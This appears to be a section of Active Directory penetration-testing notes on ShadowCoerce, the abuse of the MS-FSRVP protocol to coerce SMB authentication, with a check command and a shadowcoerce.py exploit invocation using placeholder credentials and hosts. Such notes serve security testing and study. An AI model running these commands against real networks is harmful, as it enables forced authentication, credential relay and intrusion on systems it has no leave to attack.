\section{ShadowCoerce (MS-FSRVP)}
MS-FSRVP is Microsoft's File Server Remote VSS Protocol. It's used for creating shadow copies of file shares on a remote computer, and for facilitating backup applications in performing application-consistent backup and restore of data on SMB2 shares (\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b}{docs.microsoft.com}).  That interface is available through the \verb+\pipe\FssagentRpc+ SMB named pipe.

Similarly to other MS-RPC abuses, this works by using a specific method relying on remote UNC paths. In this case, at the time of writing, two methods were detected as vulnerable: \verb+IsPathSupported+ and \verb+IsPathShadowCopied+.

 The coerced authentications are made over SMB. Unlike other similar coercion methods (MS-RPRN printerbug, MS-EFSR petitpotam), I doubt MS-FSRVP abuse can be combined with \href{https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient}{WebClient abuse} to elicit incoming authentications made over HTTP.

A requirement to the abuse is to have the "File Server VSS Agent Service" enabled on the target server.

This vuln is patched since June 2022.

check vulnerable:
\begin{verbatim}
nxc smb <target> -M shadowcoerce -o LISTENER=<ip>
\end{verbatim}

Exploit:
\begin{verbatim}
shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
\end{verbatim}




Note: the coercion needed to be attempted twice in order to work when the \verb+FssAgent+ hadn't been requested in a while. 
